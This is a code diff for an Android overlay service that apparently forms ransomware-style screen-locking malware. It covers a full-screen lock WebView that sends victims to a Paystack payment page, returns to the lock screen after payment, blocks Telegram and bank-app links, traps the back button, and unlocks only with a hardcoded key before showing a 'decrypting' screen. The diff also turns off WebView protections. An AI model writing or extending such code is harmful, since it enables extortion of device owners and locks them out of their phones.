@@ -81,30 +81,41 @@ public class OverlayService extends Service {
 
         lockWebView = new WebView(this);
         WebSettings webSettings = lockWebView.getSettings();
+        
+        // CRITICAL FIX FOR PAYSTACK
         webSettings.setJavaScriptEnabled(true);
         webSettings.setDomStorageEnabled(true);
         webSettings.setAllowUniversalAccessFromFileURLs(true);
         webSettings.setAllowFileAccessFromFileURLs(true);
+        webSettings.setJavaScriptCanOpenWindowsAutomatically(true);
+        webSettings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
+        webSettings.setLoadWithOverviewMode(true);
+        webSettings.setUseWideViewPort(true);
         
         lockWebView.setBackgroundColor(0xFF050000);
         
         lockWebView.setWebViewClient(new WebViewClient() {
             @Override
             public boolean shouldOverrideUrlLoading(WebView view, String url) {
-                // 1. If it's the Paystack checkout page, let it load so they can pay.
-                if (url.contains("paystack.com") || url.contains("checkout.paystack")) {
+                // 1. If they finish paying and return to our webhook
+                if (url.contains("fr4nx.wisp.uno") && (url.contains("reference=") || url.contains("trxref="))) {
+                    lockWebView.clearCache(true);
+                    lockWebView.loadUrl("file:///android_asset/lock_screen.html");
+                    return true;
+                }
+                
+                // 2. Allow Paystack and all web links to load
+                if (url.startsWith("http://") || url.startsWith("https://")) {
                     return false; 
                 }
                 
-                // 2. If they finish paying and click the Telegram button or any weird link...
-                // CLEAR CACHE and snap back to the lock screen so it fetches the new balance!
+                // 3. Block Telegram / Bank App links and snap back to lock screen
                 lockWebView.clearCache(true);
                 lockWebView.loadUrl("file:///android_asset/lock_screen.html");
                 return true; 
             }
         });
         
-        // 3. FIX BACK BUTTON
         lockWebView.setOnKeyListener((v, keyCode, event) -> {
             if (event.getAction() == KeyEvent.ACTION_DOWN && keyCode == KeyEvent.KEYCODE_BACK) {
                 lockWebView.clearCache(true);
@@ -138,6 +149,7 @@ public class OverlayService extends Service {
     }
 
     public void authenticateUser(String pass) {
+        // REMEMBER: The key is FR4NX.COM123
         if ("FR4NX.COM123".equals(pass)) { 
             lockWebView.post(() -> lockWebView.evaluateJavascript("showDecrypting();", null));
         } else {
